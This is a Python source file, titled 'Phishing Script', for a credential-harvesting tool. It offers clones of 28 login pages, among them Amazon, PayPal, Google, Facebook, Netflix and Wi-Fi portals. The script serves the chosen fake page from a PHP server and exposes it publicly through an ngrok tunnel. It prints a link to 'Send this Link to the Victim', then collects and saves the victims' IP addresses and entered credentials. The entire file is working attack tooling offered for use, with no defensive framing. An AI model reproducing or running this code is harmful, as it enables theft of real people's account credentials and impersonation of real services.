#!/usr/bin/python3
#Phishing Script
import sys,random,os,signal,time,re
import subprocess as sp

#Banner
banner=("""
 .d8888b.                                    d8b                   
d88P  Y88b                                   Y8P                   
Y88b.                                                              
 "Y888b.    .d8888b .d88b.  888d888 88888b.  888  .d88b.  88888b.  
    "Y88b. d88P"   d88""88b 888P"   888 "88b 888 d88""88b 888 "88b 
      "888 888     888  888 888     888  888 888 888  888 888  888 
Y88b  d88P Y88b.   Y88..88P 888     888 d88P 888 Y88..88P 888  888 
 "Y8888P"   "Y8888P "Y88P"  888     88888P"  888  "Y88P"  888  888 
                                    888                            
                                    888                            
                                    888                            """)
                                    

#Required variables
RED   = "\033[1;31m"  
RESET = "\033[0;0m"
cyan='\033[36m'
lightred='\033[91m'
yellow='\033[93m'
lightcyan='\033[96m'
green='\033[32m'
purple='\033[35m'

tableData=[
 ['\n1.Amazon         ','\n2.Apple          ','\n3.Dropbox        ','\n4.Ebay           ','\n5.Facebook       ','\n6.Github         ','\n7.Google         '],
 ['8.iCloud         ','9.Instagram      ','10.Linkedin      ','11.Microsoft     ','12.Netflix       ','13.Origin        ','14.Paypal        '],
 ['15.Pinterest     ','16.Playstation   ','17.Protonmail    ','18.Snapchat      ','19.Spotify       ','20.Steam         ','21.Twitch        '],
 ['22.Twitter       ','23.Wifi          ','24.Wifi-Expired  ','25.Wordpress     ','26.Yahoo         ','27.Yandex        ','28.EXIT          ']]
files=['amazon','apple','dropbox','ebay','facebook','github','google','icloud','instagram','linkedin','microsoft','netflix','origin','paypal','pinterest','playstation','protonmail','snapchat','spotify','steam','twitch','twitter','wifi','wifi-expired','wordpress','yahoo','yandex','exit']


def kill(): #To kill the php and ngrok  ---> Will be the last step
    if os.name== 'nt':
        os.system('taskkill /IM php.exe /F >temp1 2>&1')
        os.system('taskkill /IM ngrok.exe /F >temp1 2>&1')
    else:
        os.system('killall -9 php >temp1 2>&1')
        os.system('killall -9 ngrok >temp1 2>&1')
    if os.path.exists('temp'):
        os.remove('temp')
    if os.path.exists('temp1'):
        os.remove('temp1')
def sure(): #while exited asking for confirmation
    sys.stdout.write(RED)
    print("Do you want to exit?(Y/N)")
    sure=input("")
    if sure in ['N','n']:
        clrscr()
        main()
    else:
        clrscr()
        print("\n\n\n   Bye Bye !!!   \n\n\n")
        sys.stdout.write(RESET)
        exit()
def read(x): #reading the ip and username txt
    f = open(x, "r")
    print(f.read())
def write(source,dest): #writing the text for later purpose
    with open(source,'r') as firstfile, open(dest,'a') as secondfile: 
        for line in firstfile: 
             secondfile.write(line)
    firstfile.close()
    secondfile.close()
def clrscr():   #clear the screen for windows and linux
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
def hasPHP(): #check whether php is installed or not --->1
    try : 
        sp.check_call(['php', '-v'])
        clrscr()
        return True
    except:
        return False
def cred():     #Gathering the Credentials -->5
    sys.stdout.write(purple)
    print("\nWaiting for credentials ..")
    while(True):
        if(os.path.exists(username)):
            print("\nCredentials Found: ")
            sys.stdout.write(lightcyan)
            write(username,saveuser)
            read(username)
            sys.stdout.write(yellow)
            kill()
            break;
def phpserver(a): #starts the php server at port 8080  --->4
 sys.stdout.write(lightred)
 print("\nStarting the php server ...\n")
 os.popen('cd sites/{}/ && php -S 0.0.0.0:8080 >temp 2>&1'.format(server))
 if (a==1):
     n=os.popen('ngrok').read()
     if n =='':
         print("Ngrok Not installed ..Exiting")
         sys.stdout.write(RESET)
         exit()
     os.popen('ngrok http 8080 >temp 2>&1')
     time.sleep(10)
     vict="Send this Link to the Victim:"
     if os.name=='nt':
         print(vict)
         ngroklink=os.popen('curl -s -N http://127.0.0.1:4040/api/tunnels').read()
         r = re.findall(r"https://\w+",ngroklink)
         print(r[0]+".ngrok.io")
     else:
         print(vict)
         os.system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io"')
 if(a==0):
     sys.stdout.write(cyan)
     print("\nHosting in localhost Use Ngrok For Public Hosting !!")
     print("\nVisit https://ngrok.com and install it in the path")
     print("\nDon't forget to include the ngrok authtoken")
     print("\nhttp://127.0.0.1:8080")
     sys.stdout.write(RED)
 print("\nWaiting For the Victim to Open...\n")
 while(True):
     if(os.path.exists("sites/{}/ip.txt".format(server))):
         sys.stdout.write(green)
         print("Client Found")
         write(ip,saveip)
         read(ip)
         cred()
         break;
def main():     #Main Program Starts Here --> 3
 sys.stdout.write(RED)
 print(banner) 
 sys.stdout.write(lightcyan)
 print ("Sites that can be cloned: ")
 sys.stdout.write(yellow)
 for x, y, z, a in zip(*tableData): 
     print(x+" "*3, y+" "*3, z+" "*3, a) 
 sys.stdout.write(RESET)
 print("\nChoose the option:")
 try:
     num = int(input(""))
 except KeyboardInterrupt:
     clrscr()
     sys.stdout.write(lightred)
     print("\n\n\nKeyboard interrupted ..Exiting !!!\n\n\n")
     sys.stdout.write(RESET)        
     sys.exit(0)
 except:
     clrscr()
     print("Enter an Valid option")
     main()
     return;
 if num not in [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28]:
     clrscr()
     print("Enter an Valid option")
     main()
     return; 
 if num == 28:
     sure()
 
 global server,ip,username,temp,saveip,saveuser
 server =files[num-1]
 ip ="sites/{}/ip.txt".format(server)
 saveip="sites/{}/savedip.txt".format(server)
 saveuser="sites/{}/saveduser.txt".format(server)
 username="sites/{}/usernames.txt".format(server)
 temp= "sites/{}/temp".format(server)
 if os.path.exists(ip):
   os.remove(ip)
 if os.path.exists(username):
   os.remove(username)
 if os.path.exists(temp):
   os.remove(temp)  
 
 print("\nIs Ngrok Installed?(Y/N)")
 ngrok=input("")
 if ngrok in ['Y','y']:
     x=1
 elif ngrok in ['N','n']:
     x=0
 else:
     clrscr()
     print("Invalid Option")
     main()
     return;
 phpserver(x)
def repeat():   #After Completing the attack asking for whether to continue or exit
     print("Another Attack? (Y/N):")
     opt=input("")
     if (opt in ['Y','y']):
         clrscr()
         main()
         repeat()
     elif opt in ['n','N']:
         clrscr()
         print("\n\n\n   Bye Bye !!!   \n\n\n")
         sys.stdout.write(RESET)
         exit()
     else:
         print("Enter Valid option")
         repeat()
if not hasPHP():#if php is not installed informs to install php and exits --> 0
    sys.stdout.write(RED)
    print("Install PHP to run the Program..")
    sys.stdout.write(RESET)
    exit();
try: #the program starts here    -->2
 kill()
 main()
 repeat()
except KeyboardInterrupt: #exits if interrupted
    clrscr()
    sys.stdout.write(lightred)
    print("\n\n\nKeyboard interrupted ..Exiting !!!\n\n\n")
    sys.stdout.write(RESET)
    
    
